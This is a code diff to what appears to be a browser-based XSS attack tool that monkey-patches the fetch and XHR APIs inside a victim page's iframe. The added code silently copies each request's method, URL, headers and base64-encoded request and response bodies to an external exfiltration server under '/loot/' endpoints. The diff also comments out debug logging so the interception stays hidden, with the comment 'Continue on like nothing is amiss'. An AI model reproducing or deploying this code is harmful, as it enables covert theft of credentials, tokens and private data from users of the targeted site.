@@ -30,7 +30,7 @@ function initGlobals()
 	// when they reloaded the page. Otherwise,
 	// they'll start here
 	//window.taperstartingPage = "https://targetapp.possiblymalware.com/wp-admin";
-	window.taperstartingPage = "https://localhost:8443/";
+	window.taperstartingPage = "https://127.0.0.1:8443/";
 
 
 
@@ -556,20 +556,67 @@ function runUpdate()
 // Fetch API wrapper for monkey patching
 function customFetch(url, options)
 {
-	console.log("** Cloned Fetch API call**");
-	console.log("Fetch url: " + url);
-	console.log("Fetch method: " + options.method);
-	console.log("Fetch headers: " + JSON.stringify(options.headers));
+	// console.log("** Cloned Fetch API call**");
+	// console.log("Fetch url: " + url);
+	// console.log("Fetch method: " + options.method);
+	// console.log("Fetch headers: " + JSON.stringify(options.headers));
+	// console.log("Fetch body: " + options.body);
+
+	// send setup loot
+	request = new XMLHttpRequest();
+	request.open("POST", taperexfilServer + "/loot/fetchSetup/" + tapersessionName);
+	request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+
+	var jsonObj = new Object();
+	jsonObj["method"] = options.method;
+	jsonObj["url"]    = url;
+	var jsonString    = JSON.stringify(jsonObj);
+	request.send(jsonString);
+
+	for (const key in options.headers)
+	{
+		const value = options.headers[key];
+		// console.log("**** " + key, value);
+
+		// send header loot
+		request = new XMLHttpRequest();
+		request.open("POST", taperexfilServer + "/loot/fetchHeader/" + tapersessionName);
+		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+
+		var jsonObj = new Object();
+		jsonObj["header"] = key;
+		jsonObj["value"]  = value;
+		var jsonString    = JSON.stringify(jsonObj);
+		request.send(jsonString);
+	}
+
+	// Let's get the API call good stuff
+	const requestBody = options.body;
+
 
 	// Clone request
 	return fetch(url, options).then((response) => {
 		// clone response
 		return response.clone().text().then((body) => {
-     		console.log('Response Status:', response.status);
-      		console.log('Response Headers:', response.headers);
-        	console.log('Response Body:', body);
+			// console.log('Response Status:', response.status);
+			// console.log('Response Headers:', response.headers);
+			// console.log('Response Body:', body);
 
-        	return response;
+
+			// send API call body loot
+			request = new XMLHttpRequest();
+			request.open("POST", taperexfilServer + "/loot/fetchCall/" + tapersessionName);
+			request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+
+			var jsonObj = new Object();
+			jsonObj["requestBody"]  = btoa(requestBody);
+			jsonObj["responseBody"] = btoa(body);
+			var jsonString          = JSON.stringify(jsonObj);
+			request.send(jsonString);
+
+
+			// Continue on like nothing is amiss
+			return response;
 		});
 	})
 	.catch((error) => {
@@ -583,7 +630,7 @@ function customFetch(url, options)
 // Monkey patch API prototypes to intercept API calls
 function monkeyPatch()
 {
-	console.log("** Enabling API monkey patches...");
+	// console.log("** Enabling API monkey patches...");
 
 	// XHR Part
 	const xhrOriginalOpen      = window.XMLHttpRequest.prototype.open;
@@ -611,7 +658,7 @@ function monkeyPatch()
 		jsonObj["url"]    = url;
 		var jsonString    = JSON.stringify(jsonObj);
 		request.send(jsonString);
-	
+
 
 		xhrOriginalOpen.apply(this, arguments);
 	}
@@ -695,13 +742,10 @@ function monkeyPatch()
 	}
 
 
-	console.log("## Starting fetch monkey patching");
+	// console.log("## Starting fetch monkey patching");
 	// Fetch API monkey patching
 	const originalFetch = window.fetch;
-
-
 	document.getElementById("iframe_a").contentWindow.fetch = customFetch;
-	// window.fetch = customFetch;
 }
 
 
